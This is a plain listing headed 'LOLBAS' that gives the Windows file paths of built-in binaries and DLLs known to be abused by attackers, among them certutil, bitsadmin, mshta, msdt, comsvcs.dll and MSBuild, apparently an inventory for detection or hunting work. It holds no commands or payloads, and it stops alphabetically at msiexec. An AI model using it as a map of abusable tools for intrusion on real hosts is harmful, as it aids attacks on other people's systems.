====== LOLBAS ======

Path: C:\Windows\System32\advpack.dll
Path: C:\Windows\SysWOW64\advpack.dll
Path: C:\Windows\WinSxS\amd64_microsoft-windows-advpack_31bf3856ad364e35_11.0.22621.3527_none_cf5fcab697e2f750\advpack.dll
Path: C:\Windows\WinSxS\wow64_microsoft-windows-advpack_31bf3856ad364e35_11.0.22621.3527_none_d9b47508cc43b94b\advpack.dll
Path: C:\Windows\WinSxS\amd64_microsoft-windows-advpack_31bf3856ad364e35_11.0.22621.3527_none_cf5fcab697e2f750\f\advpack.dll
Path: C:\Windows\WinSxS\amd64_microsoft-windows-advpack_31bf3856ad364e35_11.0.22621.3527_none_cf5fcab697e2f750\r\advpack.dll
Path: C:\Windows\WinSxS\wow64_microsoft-windows-advpack_31bf3856ad364e35_11.0.22621.3527_none_d9b47508cc43b94b\f\advpack.dll
Path: C:\Windows\WinSxS\wow64_microsoft-windows-advpack_31bf3856ad364e35_11.0.22621.3527_none_d9b47508cc43b94b\r\advpack.dll
Path: C:\Windows\System32\at.exe
Path: C:\Windows\SysWOW64\at.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-at_31bf3856ad364e35_10.0.22621.2506_none_2cdc0a00ff840db6\at.exe
Path: C:\Windows\WinSxS\wow64_microsoft-windows-at_31bf3856ad364e35_10.0.22621.2506_none_3730b45333e4cfb1\at.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-at_31bf3856ad364e35_10.0.22621.2506_none_2cdc0a00ff840db6\f\at.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-at_31bf3856ad364e35_10.0.22621.2506_none_2cdc0a00ff840db6\r\at.exe
Path: C:\Windows\WinSxS\wow64_microsoft-windows-at_31bf3856ad364e35_10.0.22621.2506_none_3730b45333e4cfb1\f\at.exe
Path: C:\Windows\WinSxS\wow64_microsoft-windows-at_31bf3856ad364e35_10.0.22621.2506_none_3730b45333e4cfb1\r\at.exe
Path: C:\Windows\System32\AtBroker.exe
Path: C:\Windows\SysWOW64\AtBroker.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-atbroker_31bf3856ad364e35_10.0.22621.3672_none_af77a48899f623ea\AtBroker.exe
Path: C:\Windows\WinSxS\wow64_microsoft-windows-atbroker_31bf3856ad364e35_10.0.22621.3672_none_b9cc4edace56e5e5\AtBroker.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-atbroker_31bf3856ad364e35_10.0.22621.3672_none_af77a48899f623ea\f\AtBroker.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-atbroker_31bf3856ad364e35_10.0.22621.3672_none_af77a48899f623ea\r\AtBroker.exe
Path: C:\Windows\WinSxS\wow64_microsoft-windows-atbroker_31bf3856ad364e35_10.0.22621.3672_none_b9cc4edace56e5e5\f\AtBroker.exe
Path: C:\Windows\WinSxS\wow64_microsoft-windows-atbroker_31bf3856ad364e35_10.0.22621.3672_none_b9cc4edace56e5e5\r\AtBroker.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-lxss-bash_31bf3856ad364e35_10.0.22621.3672_none_1f725347383303f1\bash.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-lxss-bash_31bf3856ad364e35_10.0.22621.3672_none_1f725347383303f1\f\bash.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-lxss-bash_31bf3856ad364e35_10.0.22621.3672_none_1f725347383303f1\r\bash.exe
Path: C:\Windows\System32\bitsadmin.exe
Path: C:\Windows\SysWOW64\bitsadmin.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-bits-bitsadmin_31bf3856ad364e35_10.0.22621.1_none_aea75cb6002a3c3d\bitsadmin.exe
Path: C:\Windows\WinSxS\wow64_microsoft-windows-bits-bitsadmin_31bf3856ad364e35_10.0.22621.1_none_b8fc0708348afe38\bitsadmin.exe
Path: C:\Windows\System32\certutil.exe
Path: C:\Windows\SysWOW64\certutil.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-certutil_31bf3856ad364e35_10.0.22621.4036_none_959881caaed0d56b\certutil.exe
Path: C:\Windows\WinSxS\wow64_microsoft-windows-certutil_31bf3856ad364e35_10.0.22621.4036_none_9fed2c1ce3319766\certutil.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-certutil_31bf3856ad364e35_10.0.22621.4036_none_959881caaed0d56b\f\certutil.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-certutil_31bf3856ad364e35_10.0.22621.4036_none_959881caaed0d56b\r\certutil.exe
Path: C:\Windows\WinSxS\wow64_microsoft-windows-certutil_31bf3856ad364e35_10.0.22621.4036_none_9fed2c1ce3319766\f\certutil.exe
Path: C:\Windows\WinSxS\wow64_microsoft-windows-certutil_31bf3856ad364e35_10.0.22621.4036_none_9fed2c1ce3319766\r\certutil.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-audiodiagnostic_31bf3856ad364e35_10.0.22621.1_none_221d3eb9e377a49e\CL_Invocation.ps1
Path: C:\Windows\diagnostics\system\Audio\CL_Invocation.ps1
Path: C:\Windows\WinSxS\amd64_microsoft-windows-videodiagnostic_31bf3856ad364e35_10.0.22621.1_none_de77f3c8329c1783\CL_MutexVerifiers.ps1
Path: C:\Windows\diagnostics\system\Video\CL_MutexVerifiers.ps1
Path: C:\Windows\System32\cmd.exe
Path: C:\Windows\SysWOW64\cmd.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-commandprompt_31bf3856ad364e35_10.0.22621.3672_none_6ae3bb7495fd7565\cmd.exe
Path: C:\Windows\WinSxS\wow64_microsoft-windows-commandprompt_31bf3856ad364e35_10.0.22621.3672_none_753865c6ca5e3760\cmd.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-commandprompt_31bf3856ad364e35_10.0.22621.3672_none_6ae3bb7495fd7565\f\cmd.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-commandprompt_31bf3856ad364e35_10.0.22621.3672_none_6ae3bb7495fd7565\r\cmd.exe
Path: C:\Windows\WinSxS\wow64_microsoft-windows-commandprompt_31bf3856ad364e35_10.0.22621.3672_none_753865c6ca5e3760\f\cmd.exe
Path: C:\Windows\WinSxS\wow64_microsoft-windows-commandprompt_31bf3856ad364e35_10.0.22621.3672_none_753865c6ca5e3760\r\cmd.exe
Path: C:\Windows\System32\cmdkey.exe
Path: C:\Windows\SysWOW64\cmdkey.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-s..line-user-interface_31bf3856ad364e35_10.0.22621.1_none_3e7d3e78d096338c\cmdkey.exe
Path: C:\Windows\WinSxS\wow64_microsoft-windows-s..line-user-interface_31bf3856ad364e35_10.0.22621.1_none_48d1e8cb04f6f587\cmdkey.exe
Path: C:\Windows\System32\cmstp.exe
Path: C:\Windows\SysWOW64\cmstp.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-rasconnectionmanager_31bf3856ad364e35_10.0.22621.1_none_c0b60b255443bd2e\cmstp.exe
Path: C:\Windows\WinSxS\wow64_microsoft-windows-rasconnectionmanager_31bf3856ad364e35_10.0.22621.1_none_cb0ab57788a47f29\cmstp.exe
Path: C:\Windows\System32\comsvcs.dll
Path: C:\Windows\SysWOW64\comsvcs.dll
Path: C:\Windows\WinSxS\amd64_microsoft-windows-c..fe-catsrvut-comsvcs_31bf3856ad364e35_10.0.22621.3880_none_5284e7e71b8e04ea\comsvcs.dll
Path: C:\Windows\WinSxS\wow64_microsoft-windows-c..fe-catsrvut-comsvcs_31bf3856ad364e35_10.0.22621.3880_none_5cd992394feec6e5\comsvcs.dll
Path: C:\Windows\WinSxS\amd64_microsoft-windows-c..fe-catsrvut-comsvcs_31bf3856ad364e35_10.0.22621.3880_none_5284e7e71b8e04ea\f\comsvcs.dll
Path: C:\Windows\WinSxS\amd64_microsoft-windows-c..fe-catsrvut-comsvcs_31bf3856ad364e35_10.0.22621.3880_none_5284e7e71b8e04ea\r\comsvcs.dll
Path: C:\Windows\WinSxS\wow64_microsoft-windows-c..fe-catsrvut-comsvcs_31bf3856ad364e35_10.0.22621.3880_none_5cd992394feec6e5\f\comsvcs.dll
Path: C:\Windows\WinSxS\wow64_microsoft-windows-c..fe-catsrvut-comsvcs_31bf3856ad364e35_10.0.22621.3880_none_5cd992394feec6e5\r\comsvcs.dll
Path: C:\Windows\System32\control.exe
Path: C:\Windows\SysWOW64\control.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-control_31bf3856ad364e35_10.0.22621.1_none_fb01c4f19e3c04ac\control.exe
Path: C:\Windows\WinSxS\wow64_microsoft-windows-control_31bf3856ad364e35_10.0.22621.1_none_05566f43d29cc6a7\control.exe
Path: C:\Windows\WinSxS\amd64_netfx4-csc_exe_b03f5f7f11d50a3a_4.0.15912.0_none_78ce8a6e35a89ad2\csc.exe
Path: C:\Windows\WinSxS\amd64_netfx4-csc_exe_b03f5f7f11d50a3a_4.0.15912.322_none_6ee01ba4a5a0f42b\csc.exe
Path: C:\Windows\WinSxS\x86_netfx4-csc_exe_b03f5f7f11d50a3a_4.0.15912.0_none_c07bc1454a24c3d8\csc.exe
Path: C:\Windows\WinSxS\x86_netfx4-csc_exe_b03f5f7f11d50a3a_4.0.15912.322_none_b68d527bba1d1d31\csc.exe
Path: C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe
Path: C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe
Path: C:\Windows\System32\cscript.exe
Path: C:\Windows\SysWOW64\cscript.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-scripting_31bf3856ad364e35_10.0.22621.3880_none_282ad5cf7c09fb68\cscript.exe
Path: C:\Windows\WinSxS\wow64_microsoft-windows-scripting_31bf3856ad364e35_10.0.22621.3880_none_327f8021b06abd63\cscript.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-scripting_31bf3856ad364e35_10.0.22621.3880_none_282ad5cf7c09fb68\f\cscript.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-scripting_31bf3856ad364e35_10.0.22621.3880_none_282ad5cf7c09fb68\r\cscript.exe
Path: C:\Windows\WinSxS\wow64_microsoft-windows-scripting_31bf3856ad364e35_10.0.22621.3880_none_327f8021b06abd63\f\cscript.exe
Path: C:\Windows\WinSxS\wow64_microsoft-windows-scripting_31bf3856ad364e35_10.0.22621.3880_none_327f8021b06abd63\r\cscript.exe
Path: C:\Windows\System32\desktopimgdownldr.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-p..-personalizationcsp_31bf3856ad364e35_10.0.22621.4249_none_20f0e2dd562d407e\desktopimgdownldr.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-p..-personalizationcsp_31bf3856ad364e35_10.0.22621.4249_none_20f0e2dd562d407e\f\desktopimgdownldr.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-p..-personalizationcsp_31bf3856ad364e35_10.0.22621.4249_none_20f0e2dd562d407e\r\desktopimgdownldr.exe
Path: C:\Windows\WinSxS\amd64_dfsvc_b03f5f7f11d50a3a_4.0.15912.0_none_c2b647ba71508734\dfsvc.exe
Path: C:\Windows\Microsoft.NET\Framework\v4.0.30319\dfsvc.exe
Path: C:\Windows\Microsoft.NET\Framework64\v4.0.30319\dfsvc.exe
Path: C:\Windows\Microsoft.NET\assembly\GAC_MSIL\dfsvc\v4.0_4.0.0.0__b03f5f7f11d50a3a\dfsvc.exe
Path: C:\Windows\System32\esentutl.exe
Path: C:\Windows\SysWOW64\esentutl.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-e..ageengine-utilities_31bf3856ad364e35_10.0.22621.4111_none_b993084340beccea\esentutl.exe
Path: C:\Windows\WinSxS\wow64_microsoft-windows-e..ageengine-utilities_31bf3856ad364e35_10.0.22621.4111_none_c3e7b295751f8ee5\esentutl.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-e..ageengine-utilities_31bf3856ad364e35_10.0.22621.4111_none_b993084340beccea\f\esentutl.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-e..ageengine-utilities_31bf3856ad364e35_10.0.22621.4111_none_b993084340beccea\r\esentutl.exe
Path: C:\Windows\WinSxS\wow64_microsoft-windows-e..ageengine-utilities_31bf3856ad364e35_10.0.22621.4111_none_c3e7b295751f8ee5\f\esentutl.exe
Path: C:\Windows\WinSxS\wow64_microsoft-windows-e..ageengine-utilities_31bf3856ad364e35_10.0.22621.4111_none_c3e7b295751f8ee5\r\esentutl.exe
Path: C:\Windows\System32\eventvwr.exe
Path: C:\Windows\SysWOW64\eventvwr.exe
Path: C:\Windows\WinSxS\amd64_eventviewersettings_31bf3856ad364e35_10.0.22621.4249_none_d4f66dfe7f3704bd\eventvwr.exe
Path: C:\Windows\WinSxS\wow64_eventviewersettings_31bf3856ad364e35_10.0.22621.4249_none_df4b1850b397c6b8\eventvwr.exe
Path: C:\Windows\WinSxS\amd64_eventviewersettings_31bf3856ad364e35_10.0.22621.4249_none_d4f66dfe7f3704bd\f\eventvwr.exe
Path: C:\Windows\WinSxS\amd64_eventviewersettings_31bf3856ad364e35_10.0.22621.4249_none_d4f66dfe7f3704bd\r\eventvwr.exe
Path: C:\Windows\WinSxS\wow64_eventviewersettings_31bf3856ad364e35_10.0.22621.4249_none_df4b1850b397c6b8\f\eventvwr.exe
Path: C:\Windows\WinSxS\wow64_eventviewersettings_31bf3856ad364e35_10.0.22621.4249_none_df4b1850b397c6b8\r\eventvwr.exe
Path: C:\Windows\System32\expand.exe
Path: C:\Windows\SysWOW64\expand.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-expand_31bf3856ad364e35_10.0.22621.1_none_ba0848304b9ea147\expand.exe
Path: C:\Windows\WinSxS\wow64_microsoft-windows-expand_31bf3856ad364e35_10.0.22621.1_none_c45cf2827fff6342\expand.exe
Path: C:\Program Files\Internet Explorer\ExtExport.exe
Path: C:\Program Files (x86)\Internet Explorer\ExtExport.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-ie-impexp-extexport_31bf3856ad364e35_11.0.22621.3527_none_519225dd6897ffae\ExtExport.exe
Path: C:\Windows\WinSxS\x86_microsoft-windows-ie-impexp-extexport_31bf3856ad364e35_11.0.22621.3527_none_f5738a59b03a8e78\ExtExport.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-ie-impexp-extexport_31bf3856ad364e35_11.0.22621.3527_none_519225dd6897ffae\f\ExtExport.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-ie-impexp-extexport_31bf3856ad364e35_11.0.22621.3527_none_519225dd6897ffae\r\ExtExport.exe
Path: C:\Windows\WinSxS\x86_microsoft-windows-ie-impexp-extexport_31bf3856ad364e35_11.0.22621.3527_none_f5738a59b03a8e78\f\ExtExport.exe
Path: C:\Windows\WinSxS\x86_microsoft-windows-ie-impexp-extexport_31bf3856ad364e35_11.0.22621.3527_none_f5738a59b03a8e78\r\ExtExport.exe
Path: C:\Windows\System32\extrac32.exe
Path: C:\Windows\SysWOW64\extrac32.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-extrac32_31bf3856ad364e35_10.0.22621.1_none_3cbf6652f7a393ed\extrac32.exe
Path: C:\Windows\WinSxS\wow64_microsoft-windows-extrac32_31bf3856ad364e35_10.0.22621.1_none_471410a52c0455e8\extrac32.exe
Path: C:\Windows\System32\findstr.exe
Path: C:\Windows\SysWOW64\findstr.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-findstr_31bf3856ad364e35_10.0.22621.1_none_88c557164d72d7c3\findstr.exe
Path: C:\Windows\WinSxS\wow64_microsoft-windows-findstr_31bf3856ad364e35_10.0.22621.1_none_931a016881d399be\findstr.exe
Path: C:\Windows\System32\forfiles.exe
Path: C:\Windows\SysWOW64\forfiles.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-forfiles_31bf3856ad364e35_10.0.22621.1_none_b6b93b53d146fa89\forfiles.exe
Path: C:\Windows\WinSxS\wow64_microsoft-windows-forfiles_31bf3856ad364e35_10.0.22621.1_none_c10de5a605a7bc84\forfiles.exe
Path: C:\Windows\System32\ftp.exe
Path: C:\Windows\SysWOW64\ftp.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-ftp_31bf3856ad364e35_10.0.22621.3085_none_8d03ee21d3f9a840\ftp.exe
Path: C:\Windows\WinSxS\wow64_microsoft-windows-ftp_31bf3856ad364e35_10.0.22621.3085_none_97589874085a6a3b\ftp.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-ftp_31bf3856ad364e35_10.0.22621.3085_none_8d03ee21d3f9a840\f\ftp.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-ftp_31bf3856ad364e35_10.0.22621.3085_none_8d03ee21d3f9a840\r\ftp.exe
Path: C:\Windows\WinSxS\wow64_microsoft-windows-ftp_31bf3856ad364e35_10.0.22621.3085_none_97589874085a6a3b\f\ftp.exe
Path: C:\Windows\WinSxS\wow64_microsoft-windows-ftp_31bf3856ad364e35_10.0.22621.3085_none_97589874085a6a3b\r\ftp.exe
Path: C:\Windows\System32\gpscript.exe
Path: C:\Windows\SysWOW64\gpscript.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-grouppolicy-script_31bf3856ad364e35_10.0.22621.1_none_c6ad0436636a732c\gpscript.exe
Path: C:\Windows\WinSxS\wow64_microsoft-windows-grouppolicy-script_31bf3856ad364e35_10.0.22621.1_none_d101ae8897cb3527\gpscript.exe
Path: C:\Windows\hh.exe
Path: C:\Windows\SysWOW64\hh.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-htmlhelp_31bf3856ad364e35_10.0.22621.1_none_29ebc266787aab53\hh.exe
Path: C:\Windows\WinSxS\wow64_microsoft-windows-htmlhelp_31bf3856ad364e35_10.0.22621.1_none_34406cb8acdb6d4e\hh.exe
Path: C:\Windows\System32\ie4uinit.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-ie-setup-support_31bf3856ad364e35_11.0.22621.3672_none_e95fbdcf038ecd4d\ie4uinit.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-ie-setup-support_31bf3856ad364e35_11.0.22621.3672_none_e95fbdcf038ecd4d\f\ie4uinit.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-ie-setup-support_31bf3856ad364e35_11.0.22621.3672_none_e95fbdcf038ecd4d\r\ie4uinit.exe
Path: C:\Windows\System32\IEAdvpack.dll
Path: C:\Windows\SysWOW64\IEAdvpack.dll
Path: C:\Windows\WinSxS\amd64_microsoft-windows-ie-ieadvpack_31bf3856ad364e35_11.0.22621.3527_none_f286afb173a10433\IEAdvpack.dll
Path: C:\Windows\WinSxS\x86_microsoft-windows-ie-ieadvpack_31bf3856ad364e35_11.0.22621.3527_none_9668142dbb4392fd\IEAdvpack.dll
Path: C:\Windows\WinSxS\amd64_microsoft-windows-ie-ieadvpack_31bf3856ad364e35_11.0.22621.3527_none_f286afb173a10433\f\IEAdvpack.dll
Path: C:\Windows\WinSxS\amd64_microsoft-windows-ie-ieadvpack_31bf3856ad364e35_11.0.22621.3527_none_f286afb173a10433\r\IEAdvpack.dll
Path: C:\Windows\WinSxS\x86_microsoft-windows-ie-ieadvpack_31bf3856ad364e35_11.0.22621.3527_none_9668142dbb4392fd\f\IEAdvpack.dll
Path: C:\Windows\WinSxS\x86_microsoft-windows-ie-ieadvpack_31bf3856ad364e35_11.0.22621.3527_none_9668142dbb4392fd\r\IEAdvpack.dll
Path: C:\Windows\WinSxS\amd64_netfx4-ilasm_exe_b03f5f7f11d50a3a_4.0.15912.0_none_61c655cc264adc4b\ilasm.exe
Path: C:\Windows\WinSxS\amd64_netfx4-ilasm_exe_b03f5f7f11d50a3a_4.0.15912.156_none_57dbe3f2963fa1a5\ilasm.exe
Path: C:\Windows\WinSxS\x86_netfx4-ilasm_exe_b03f5f7f11d50a3a_4.0.15912.0_none_a9738ca33ac70551\ilasm.exe
Path: C:\Windows\WinSxS\x86_netfx4-ilasm_exe_b03f5f7f11d50a3a_4.0.15912.156_none_9f891ac9aabbcaab\ilasm.exe
Path: C:\Windows\Microsoft.NET\Framework\v4.0.30319\ilasm.exe
Path: C:\Windows\Microsoft.NET\Framework64\v4.0.30319\ilasm.exe
Path: C:\Windows\System32\InfDefaultInstall.exe
Path: C:\Windows\SysWOW64\InfDefaultInstall.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-infdefaultinstall_31bf3856ad364e35_10.0.22621.1_none_ce2a4f738fcd9a38\InfDefaultInstall.exe
Path: C:\Windows\WinSxS\wow64_microsoft-windows-infdefaultinstall_31bf3856ad364e35_10.0.22621.1_none_d87ef9c5c42e5c33\InfDefaultInstall.exe
Path: C:\Windows\WinSxS\amd64_installutil_b03f5f7f11d50a3a_4.0.15912.0_none_d8607d8709732f01\InstallUtil.exe
Path: C:\Windows\WinSxS\wow64_installutil_b03f5f7f11d50a3a_4.0.15912.0_none_022ec4a0cabdc41e\InstallUtil.exe
Path: C:\Windows\Microsoft.NET\Framework\v4.0.30319\InstallUtil.exe
Path: C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe
Path: C:\Windows\WinSxS\amd64_jsc_b03f5f7f11d50a3a_4.0.15912.0_none_04bcf928bfc9ab50\jsc.exe
Path: C:\Windows\WinSxS\wow64_jsc_b03f5f7f11d50a3a_4.0.15912.0_none_2e8b40428114406d\jsc.exe
Path: C:\Windows\Microsoft.NET\Framework\v4.0.30319\jsc.exe
Path: C:\Windows\Microsoft.NET\Framework64\v4.0.30319\jsc.exe
Path: C:\Windows\System32\makecab.exe
Path: C:\Windows\SysWOW64\makecab.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-makecab_31bf3856ad364e35_10.0.22621.1_none_52654d9a5cfd091d\makecab.exe
Path: C:\Windows\WinSxS\wow64_microsoft-windows-makecab_31bf3856ad364e35_10.0.22621.1_none_5cb9f7ec915dcb18\makecab.exe
Path: C:\Windows\System32\mavinject.exe
Path: C:\Windows\SysWOW64\mavinject.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-appmanagement-appvwow_31bf3856ad364e35_10.0.22621.4036_none_934d46256ddb07c2\mavinject.exe
Path: C:\Windows\WinSxS\wow64_microsoft-windows-appmanagement-appvwow_31bf3856ad364e35_10.0.22621.4036_none_9da1f077a23bc9bd\mavinject.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-appmanagement-appvwow_31bf3856ad364e35_10.0.22621.4036_none_934d46256ddb07c2\f\mavinject.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-appmanagement-appvwow_31bf3856ad364e35_10.0.22621.4036_none_934d46256ddb07c2\r\mavinject.exe
Path: C:\Windows\WinSxS\wow64_microsoft-windows-appmanagement-appvwow_31bf3856ad364e35_10.0.22621.4036_none_9da1f077a23bc9bd\f\mavinject.exe
Path: C:\Windows\WinSxS\wow64_microsoft-windows-appmanagement-appvwow_31bf3856ad364e35_10.0.22621.4036_none_9da1f077a23bc9bd\r\mavinject.exe
Path: C:\Windows\WinSxS\amd64_microsoft.workflow.compiler_31bf3856ad364e35_4.0.15912.0_none_ed62602ac24399fc\Microsoft.Workflow.Compiler.exe
Path: C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe
Path: C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe
Path: C:\Windows\Microsoft.NET\assembly\GAC_MSIL\Microsoft.Workflow.Compiler\v4.0_4.0.0.0__31bf3856ad364e35\Microsoft.Workflow.Compiler.exe
Path: C:\Windows\System32\mmc.exe
Path: C:\Windows\SysWOW64\mmc.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-m..-management-console_31bf3856ad364e35_10.0.22621.4317_none_ef643dcdf130bc1f\mmc.exe
Path: C:\Windows\WinSxS\wow64_microsoft-windows-m..-management-console_31bf3856ad364e35_10.0.22621.4317_none_f9b8e82025917e1a\mmc.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-m..-management-console_31bf3856ad364e35_10.0.22621.4317_none_ef643dcdf130bc1f\f\mmc.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-m..-management-console_31bf3856ad364e35_10.0.22621.4317_none_ef643dcdf130bc1f\r\mmc.exe
Path: C:\Windows\WinSxS\wow64_microsoft-windows-m..-management-console_31bf3856ad364e35_10.0.22621.4317_none_f9b8e82025917e1a\f\mmc.exe
Path: C:\Windows\WinSxS\wow64_microsoft-windows-m..-management-console_31bf3856ad364e35_10.0.22621.4317_none_f9b8e82025917e1a\r\mmc.exe
Path: C:\Windows\WinSxS\amd64_msbuild_b03f5f7f11d50a3a_4.0.15912.0_none_de1bfcc9998a681e\MSBuild.exe
Path: C:\Windows\WinSxS\wow64_msbuild_b03f5f7f11d50a3a_4.0.15912.0_none_07ea43e35ad4fd3b\MSBuild.exe
Path: C:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe
Path: C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe
Path: C:\Windows\Microsoft.NET\assembly\GAC_32\MSBuild\v4.0_4.0.0.0__b03f5f7f11d50a3a\MSBuild.exe
Path: C:\Windows\Microsoft.NET\assembly\GAC_64\MSBuild\v4.0_4.0.0.0__b03f5f7f11d50a3a\MSBuild.exe
Path: C:\Windows\System32\msconfig.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-msconfig-exe_31bf3856ad364e35_10.0.22621.4249_none_ba78d47b1943f14c\msconfig.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-msconfig-exe_31bf3856ad364e35_10.0.22621.4249_none_ba78d47b1943f14c\f\msconfig.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-msconfig-exe_31bf3856ad364e35_10.0.22621.4249_none_ba78d47b1943f14c\r\msconfig.exe
Path: C:\Windows\System32\msdt.exe
Path: C:\Windows\SysWOW64\msdt.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-msdt_31bf3856ad364e35_10.0.22621.3672_none_855956aa99276574\msdt.exe
Path: C:\Windows\WinSxS\wow64_microsoft-windows-msdt_31bf3856ad364e35_10.0.22621.3672_none_8fae00fccd88276f\msdt.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-msdt_31bf3856ad364e35_10.0.22621.3672_none_855956aa99276574\f\msdt.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-msdt_31bf3856ad364e35_10.0.22621.3672_none_855956aa99276574\r\msdt.exe
Path: C:\Windows\WinSxS\wow64_microsoft-windows-msdt_31bf3856ad364e35_10.0.22621.3672_none_8fae00fccd88276f\f\msdt.exe
Path: C:\Windows\WinSxS\wow64_microsoft-windows-msdt_31bf3856ad364e35_10.0.22621.3672_none_8fae00fccd88276f\r\msdt.exe
Path: C:\Windows\System32\mshta.exe
Path: C:\Windows\SysWOW64\mshta.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-ie-htmlapplication_31bf3856ad364e35_11.0.22621.2506_none_7cec68cbae71aeca\mshta.exe
Path: C:\Windows\WinSxS\wow64_microsoft-windows-ie-htmlapplication_31bf3856ad364e35_11.0.22621.2506_none_8741131de2d270c5\mshta.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-ie-htmlapplication_31bf3856ad364e35_11.0.22621.2506_none_7cec68cbae71aeca\f\mshta.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-ie-htmlapplication_31bf3856ad364e35_11.0.22621.2506_none_7cec68cbae71aeca\r\mshta.exe
Path: C:\Windows\WinSxS\wow64_microsoft-windows-ie-htmlapplication_31bf3856ad364e35_11.0.22621.2506_none_8741131de2d270c5\f\mshta.exe
Path: C:\Windows\WinSxS\wow64_microsoft-windows-ie-htmlapplication_31bf3856ad364e35_11.0.22621.2506_none_8741131de2d270c5\r\mshta.exe
Path: C:\Windows\System32\mshtml.dll
Path: C:\Windows\SysWOW64\mshtml.dll
Path: C:\Windows\WinSxS\amd64_microsoft-windows-i..tmlrendering-legacy_31bf3856ad364e35_11.0.22621.4317_none_35db1abd57595b00\mshtml.dll
Path: C:\Windows\WinSxS\wow64_microsoft-windows-i..tmlrendering-legacy_31bf3856ad364e35_11.0.22621.4317_none_402fc50f8bba1cfb\mshtml.dll
Path: C:\Windows\WinSxS\amd64_microsoft-windows-i..tmlrendering-legacy_31bf3856ad364e35_11.0.22621.4317_none_35db1abd57595b00\f\mshtml.dll
Path: C:\Windows\WinSxS\amd64_microsoft-windows-i..tmlrendering-legacy_31bf3856ad364e35_11.0.22621.4317_none_35db1abd57595b00\r\mshtml.dll
Path: C:\Windows\WinSxS\wow64_microsoft-windows-i..tmlrendering-legacy_31bf3856ad364e35_11.0.22621.4317_none_402fc50f8bba1cfb\f\mshtml.dll
Path: C:\Windows\WinSxS\wow64_microsoft-windows-i..tmlrendering-legacy_31bf3856ad364e35_11.0.22621.4317_none_402fc50f8bba1cfb\r\mshtml.dll
Path: C:\Windows\System32\msiexec.exe
Path: C:\Windows\SysWOW64\msiexec.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-installer-executable_31bf3856ad364e35_10.0.22621.3880_none_2943f78601c9ec92\msiexec.exe
Path: C:\Windows\WinSxS\wow64_microsoft-windows-installer-executable_31bf3856ad364e35_10.0.22621.3880_none_3398a1d8362aae8d\msiexec.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-installer-executable_31bf3856ad364e35_10.0.22621.3880_none_2943f78601c9ec92\f\msiexec.exe
Path: C:\Windows\WinSxS\amd64_microsoft-windows-installer-executable_31bf3856ad364e35_10.0.22621.3880_none_2943f78601c9ec92\r\msiexec.exe
